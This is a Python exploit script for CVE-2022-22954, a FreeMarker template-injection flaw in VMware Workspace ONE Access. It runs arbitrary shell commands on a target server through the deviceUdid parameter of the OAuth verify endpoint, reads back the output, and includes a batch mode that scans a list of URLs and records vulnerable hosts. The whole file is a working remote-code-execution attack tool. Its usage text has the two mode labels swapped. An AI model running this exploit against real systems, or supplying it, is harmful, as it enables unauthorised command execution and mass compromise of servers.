import argparse
import requests
import urllib3
import json
import re
urllib3.disable_warnings()
import urllib.request

hello = '''   _______      ________    ___   ___ ___  ___      ___  ___   ___  _____ _  _   
  / ____\ \    / /  ____|  |__ \ / _ \__ \|__ \    |__ \|__ \ / _ \| ____| || |  
 | |     \ \  / /| |__ ______ ) | | | | ) |  ) |_____ ) |  ) | (_) | |__ | || |_ 
 | |      \ \/ / |  __|______/ /| | | |/ /  / /______/ /  / / \__, |___ \|__   _|
 | |____   \  /  | |____    / /_| |_| / /_ / /_     / /_ / /_   / / ___) |  | |  
  \_____|   \/   |______|  |____|\___/____|____|   |____|____| /_/ |____/   |_|  
                                                                                                                                                               
power by jax                                                                                 

'''

headers = {
    'Accept-Encoding': 'gzip, deflate',
    'Accept': '*/*',
    'Accept-Language': 'en',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
    'Content-Type': 'application/json'
}


def rce_exp(url , cmd):
    base_uri = '/catalog-portal/ui/oauth/verify?error=&deviceUdid='
    cmd_uri = '${"freemarker.template.utility.Execute"?new()("' + cmd + '")}'
    payload_uri = base_uri + urllib.request.quote(cmd_uri)
    target_url = url + payload_uri
    #print(target_url)
    try:
        resp = requests.get(target_url ,verify=False,timeout=1)
        resp_text = resp.text
        #print(resp_text)
        resp_code = resp.status_code
    except requests.exceptions.RequestException:
        print('[-]获取回显超时')
    except:
        print('[-]获取回显异常，请手动测试')
    if resp_code == 400:
            cmd_resp = re.findall(r'(?<=console.log\("Authorization context is not valid. Login request  received with tenant code: awaccess, device id: ).+(?=, device type: null and token revoke status: false.")', resp_text)
            cmd_resp = str(cmd_resp).strip('[').strip(']').strip("'")
            print('[+]获取回显命令成功：\n' + cmd_resp.encode('utf8').decode('unicode_escape').encode('utf8').decode('unicode_escape'))#把字符串"\n"、"\t"、"\uffef"等转化为真正的换行符、制表符
    else:
        print('[-]获取回显失败，请确认是否存在漏洞')

#批量检测漏洞
def poc(target):
    print("start scaning")
    f = open(target)
    f = f.readlines()
    for url in f:
        url =url.strip('\n')
        url =url.strip('/')
        target_url = url + '/catalog-portal/ui/oauth/verify?error=&deviceUdid=%24%7B%22freemarker.template.utility.Execute%22%3Fnew%28%29%28%22id%22%29%7D'
        try:
            resp = requests.get(target_url ,verify=False,timeout=1)
            resp_text = resp.text
            resp_code = resp.status_code
            if resp_code == 400:
                if re.search('auth.context.invalid', resp_text, flags=0) != None:
                    print(f'[+]{url}疑似存在漏洞')
                    poc_file = open('success.txt','a+')
                    poc_file.write(url+'\n')
                    poc_file.close()
            else:
                print(f'[-]{url}不存在漏洞')
        except requests.exceptions.RequestException:
            time_poc = f'[-]{url}漏洞检测超时'
            print(time_poc)
            pass
        except:
            continue

if __name__ == '__main__' :
    print(hello)
    parser = argparse.ArgumentParser(description="CVE-2022-22954.py")
    parser.add_argument('-m', '--mode', type=str, help="run mode: -m scan or -m rce")
    parser.add_argument('-f', '--file', type=str, help="scan urls , one url per line in file")
    parser.add_argument('-u', '--url', type=str, help="target url for example : https://www.qq.com")
    parser.add_argument('-c', '--cmd', type=str, help="execute command: -c id or --cmd id")
    args = parser.parse_args()

    if args.mode == "scan" and args.file != None :
        target = args.file
        poc(target)

    elif args.cmd != None and args.url != None:
        url = args.url
        cmd = args.cmd
        rce_exp(url , cmd)
    else:
        print("scan mode: python3 CVE-2022-22954.py -m rce -c id -u https://www.xxx.com")
        print("rce mode: python3 CVE-2022-22954.py  -m scan -f 123.txt")
